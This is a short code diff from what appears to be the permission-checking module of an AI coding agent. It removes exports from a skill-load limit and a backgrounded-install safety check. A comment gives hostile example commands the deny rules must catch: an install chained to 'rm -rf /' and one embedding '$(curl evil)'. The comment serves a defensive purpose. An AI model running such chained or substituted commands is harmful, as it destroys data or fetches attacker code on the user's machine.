@@ -40,7 +40,7 @@ export const MAX_CONSECUTIVE_BASH_DENIES = 5;
  * gets blocked with a clear "use the cached body" message that breaks
  * the loop instead of letting it burn turns.
  */
-export const MAX_LOAD_SKILL_PER_ID = 2;
+const MAX_LOAD_SKILL_PER_ID = 2;
 
 /** Matches `sleep <number>` at the start of a command or after a chain operator. */
 const SLEEP_COMMAND_PATTERN = /(?:^|[;&|\n]\s*)\s*sleep\s+(\d+(?:\.\d+)?)/i;
@@ -336,7 +336,7 @@ export function matchesAllowedPrefix(command: string, _depth = 0): boolean {
  * before we approve, so commands like `pnpm add foo; rm -rf /` or
  * `pnpm add foo $(curl evil) &` still get caught by the deny rules below.
  */
-export function isSafeBackgroundedInstall(command: string): boolean {
+function isSafeBackgroundedInstall(command: string): boolean {
   // Strip stderr redirection (2>&1, 2>&2, 1>&2, …) so we can pattern-match
   // the underlying base command + & terminator.
   const stripped = command.replace(/\s*\d*>&\d+\s*/g, ' ').trim();
